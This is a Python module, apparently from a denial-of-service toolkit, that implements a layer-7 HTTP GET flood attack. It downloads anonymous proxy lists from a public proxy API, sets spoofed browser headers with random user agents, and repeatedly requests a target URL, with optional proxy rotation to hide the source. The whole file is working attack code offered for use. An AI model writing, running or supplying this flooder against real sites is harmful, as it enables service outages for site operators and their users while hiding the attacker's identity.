"""This module provides the flood function for an HTTP GET request DoS attack."""

import json
import random
import warnings

import requests
from colorama import Fore  # type: ignore[import]
from requests.exceptions import ConnectTimeout, ReadTimeout

from tools.crash import CriticalError  # type: ignore[import]

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

with open("tools/L7/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]

with requests.get(
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    verify=False,
) as proxies:
    proxies_ = list()
    for proxy in proxies.text.split("\r\n"):
        if proxy != "":
            proxies_.append({"http": proxy, "https": proxy})

headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),
}

color_code = {True: Fore.GREEN, False: Fore.RED}


def flood(target: str, use_proxy: bool) -> None:
    """Start the HTTP GET request flood.

    Args:
        - target - Target's URL
        - use_proxy - Whether or not to use proxy

    Returns:
        None
    """
    try:
        if use_proxy:
            proxy = random.choice(proxies_)
            r = requests.get(target, headers=headers, proxies=proxy, timeout=4)
        else:
            r = requests.get(target, headers=headers, timeout=4)
    except (ConnectTimeout, ReadTimeout, OSError):
        # Ignoring exceptions related to proxy connection
        return
    except Exception as err:
        CriticalError("There was an error during the HTTP attack", err)
    else:
        status = f"{color_code[r.status_code == 200]}Status: [{r.status_code}]"
        payload_size = f"{Fore.CYAN} Requested Data Size: {len(r.content)/1000:>10} KB"
        proxy_addr = f"| {Fore.CYAN}Proxy: {proxy['http']:>21}" if use_proxy else ""
        print(
            f"{status}{Fore.RESET} --> {payload_size} {Fore.RESET}{proxy_addr}{Fore.RESET}"
        )
